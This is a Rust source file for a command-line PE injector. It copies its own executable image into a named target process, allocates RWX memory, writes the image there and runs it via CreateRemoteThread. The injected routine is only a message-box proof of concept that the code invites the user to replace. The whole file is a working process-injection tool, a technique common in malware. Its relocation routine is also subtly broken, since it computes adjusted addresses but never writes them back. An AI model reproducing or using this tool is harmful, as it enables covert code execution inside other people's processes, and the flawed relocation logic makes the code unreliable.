use clap::Parser;

use sysinfo::{Pid, ProcessExt, SystemExt};

use std::{
        ptr::{
        null, null_mut, copy_nonoverlapping
    },
    mem::{
        transmute
    }, 
    ffi::c_void, io,
};
use winapi::{
    um::{
        libloaderapi::{
            GetModuleHandleA
        }, 
        winnt::{
            PIMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, PIMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE, MEM_COMMIT, PAGE_EXECUTE_READWRITE, MAXIMUM_ALLOWED, PAGE_READWRITE, IMAGE_DIRECTORY_ENTRY_BASERELOC, PIMAGE_BASE_RELOCATION, IMAGE_BASE_RELOCATION, IMAGE_REL_BASED_DIR64
        }, memoryapi::{VirtualAllocEx, VirtualAlloc, WriteProcessMemory}, processthreadsapi::{OpenProcess, CreateRemoteThread}, 
        handleapi::{
            CloseHandle
        }, 
        errhandlingapi::GetLastError, winuser::{MessageBoxA, MB_OK},
    }, 
    shared::minwindef::{FALSE, DWORD, LPVOID}
};

// Get IMAGE_NT_HEADERS of the image base address
fn get_image_nt_headers(image_base: *mut c_void) -> PIMAGE_NT_HEADERS64 {
    unsafe {
        let dos_header = transmute::<_, PIMAGE_DOS_HEADER>(image_base);

        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            panic!("[-] Failed to get IMAGE_DOS_HEADER");
        }
    
        println!("[+] IMAGE_DOS_HEADER: {:p}", dos_header);

        let nt_headers = transmute::<usize, PIMAGE_NT_HEADERS64>(
            image_base as usize + (*dos_header).e_lfanew as usize,
        );

        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
            panic!("[-] Failed to get IMAGE_NT_HEADERS");
        }

        println!("[+] IMAGE_NT_HEADERS: {:p}", nt_headers);
        
        nt_headers
    }
}


// Perform image base relocation
fn relocate_image_by_delta(relocations: Vec<RelocationInformation>, delta: isize) {
    let mut relocate_me = 0;

    relocations.iter().for_each(|relocation| {
        for i in 0..relocation.count {
            let type_field = unsafe { relocation.item.offset(i as isize).read() } >> 12;
            let offset = unsafe { relocation.item.offset(i as isize).read() } & 0xFFF;

            if type_field == IMAGE_REL_BASED_DIR64 {
                unsafe {
                    relocate_me = *((relocation.address + offset as u64) as *mut isize);
                    relocate_me = delta + relocate_me;
                };
            }
        }
    });
}

#[derive(Debug, Clone, Copy)]
struct RelocationInformation {
    address: u64,
    item: *const u16,
    count: i32,
}

// Get relocation information
fn get_image_relocations(image_base: *mut c_void) -> Vec<RelocationInformation> {

    let nt_headers = get_image_nt_headers(image_base);

    let mut current_base_relocation = unsafe {
        transmute::<usize, PIMAGE_BASE_RELOCATION>(
            image_base as usize
                + (*nt_headers).OptionalHeader.DataDirectory
                    [IMAGE_DIRECTORY_ENTRY_BASERELOC as usize]
                    .VirtualAddress as usize,
        )
    };
    
    println!("[+] IMAGE_BASE_RELOCATION: {:p}", current_base_relocation);

    let relocation_end = unsafe {
        current_base_relocation as usize
            + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize]
                .Size as usize
    };

    println!("[+] IMAGE_BASE_RELOCATION End: {:#x}", relocation_end);

    let mut relocation_result: Vec<RelocationInformation> = vec![];

    while unsafe {
        (*current_base_relocation).VirtualAddress != 0u32
            && (*current_base_relocation).VirtualAddress as usize <= relocation_end
            && (*current_base_relocation).SizeOfBlock != 0u32
    } 
    {
        
        let mut info: RelocationInformation = unsafe { std::mem::zeroed() };

        info.address = unsafe { image_base as usize + (*current_base_relocation).VirtualAddress as usize } as _;
        
        info.item = unsafe {
            transmute::<usize, *const u16>(
                current_base_relocation as usize + std::mem::size_of::<IMAGE_BASE_RELOCATION>(),
            )
        };

        info.count = unsafe {
            ((*current_base_relocation).SizeOfBlock as usize
                - std::mem::size_of::<IMAGE_BASE_RELOCATION>())
                / std::mem::size_of::<u16>()
        } as _;

        relocation_result.push(info);

        current_base_relocation = unsafe {
            transmute::<usize, PIMAGE_BASE_RELOCATION>(
                current_base_relocation as usize + (*current_base_relocation).SizeOfBlock as usize,
            )
        };
    }

    relocation_result
}

// Gets user input from the terminal
fn get_input() -> io::Result<()> {
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(())
}

// Used for debugging
fn pause() {
    match get_input() {
        Ok(buffer) => println!("{:?}", buffer),
        Err(error) => println!("error: {}", error),
    };
}

// Panic and print GetLastError
fn error(text: &str){
    panic!("[-] {} {}", text, unsafe { GetLastError()});
}

// Get Process ID
fn get_process_id_by_name(target_process: &str) -> Pid {
    let mut system = sysinfo::System::new();
    system.refresh_all();

    let mut process_id = 0;

    for process in system.process_by_name(target_process) {
        process_id = process.pid();
    }

    return process_id;
}

// Change accordingly: code to execute inside target process (PoC)
fn entry_point() {
    unsafe { MessageBoxA(null_mut(), "Hello\0".as_ptr() as _, "World\0".as_ptr() as _ , MB_OK) };
}


/// Portable executable injector (PE injector)
#[derive(Parser, Debug)]
#[clap(author, version, about, long_about = None)]
struct Args {
    /// Target process to inject PE
    #[clap(short, long)]
    process: String,
}

fn main() {
    let args = Args::parse();

    let image_base = unsafe { GetModuleHandleA(null()) as *mut c_void };
    println!("[+] ImageBaseAddress: {:p}", image_base);

    let nt_headers = get_image_nt_headers(image_base);
    let process_id = get_process_id_by_name(args.process.as_str());

    // Allocate memory in the current process for the PE image
    let local_image = unsafe { 
        VirtualAlloc(
            null_mut(),
            (*nt_headers).OptionalHeader.SizeOfImage as usize,
            MEM_COMMIT,
            PAGE_READWRITE
        )
    };

    if local_image == null_mut() {
        error("Failed to allocate memory in the current PE image");
    }

    println!("\n[+] Local Image Allocated Memory Region: {:p}", local_image);

    // Copy the PE image it the allocated region of the current process
    unsafe { 
        copy_nonoverlapping(
            image_base as *const _,
            local_image,
            (*nt_headers).OptionalHeader.SizeOfImage as usize
        )
    };

    // Open the target process to inject PE image
    let target_process = unsafe { 
        OpenProcess(
            MAXIMUM_ALLOWED,
            FALSE,
            process_id as u32
        )
    };

    if target_process == null_mut() {
        error("Failed to open the target process");
    }

    println!("[+] Process Handle: {:?}", target_process);

    // Allocate memory in the target process to inject the PE image
    let target_image = unsafe { 
        VirtualAllocEx(
            target_process,
            null_mut(),
            (*nt_headers).OptionalHeader.SizeOfImage as usize,
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        )
    };

    if target_image == null_mut() {
        error("Failed to allocate memory in the target process for PE file");
    }
    
    println!("[+] Remote Image Allocated Memory Region: {:p}", target_image);

    // Calculate the difference between destination image address and source image base address (delta)
    let delta_image_base = unsafe { target_image as isize - (*nt_headers).OptionalHeader.ImageBase as isize };
    println!("[+] Calculate Delta: {:#x} - {:#x} = {:#x}\n", target_image as isize, unsafe { (*nt_headers).OptionalHeader.ImageBase as isize }, delta_image_base);

    // Get the relocation information of the current image
    let relocation_info = get_image_relocations(image_base);

    // Relocate the current image by delta
    relocate_image_by_delta(relocation_info, delta_image_base);

    // Write the relocated PE image into the target process
    let wpm_result = unsafe { 
        WriteProcessMemory(
            target_process,
            target_image,
            local_image,
            (*nt_headers).OptionalHeader.SizeOfImage as usize,
            null_mut()
        )
    };
    
    if wpm_result == 0 {
        error("Failed to write source image to destination image");
    }

    // Create an LPTHREAD_START_ROUTINE for CreateRemoteThread
    type ThreadStartRoutine = unsafe extern "system" fn(LPVOID) -> DWORD;
    let start_routine = unsafe { Some(transmute::<_, ThreadStartRoutine>(entry_point as isize + delta_image_base)) };    

    // Create a thread in the target process to start the injected PE image
    let thread_handle = unsafe { 
        CreateRemoteThread(
            target_process,
            null_mut(),
            0,
            start_routine,
            null_mut(),
            0,
            null_mut()
        )
    };

    unsafe { 
        CloseHandle(thread_handle);
        CloseHandle(target_process);
    }
}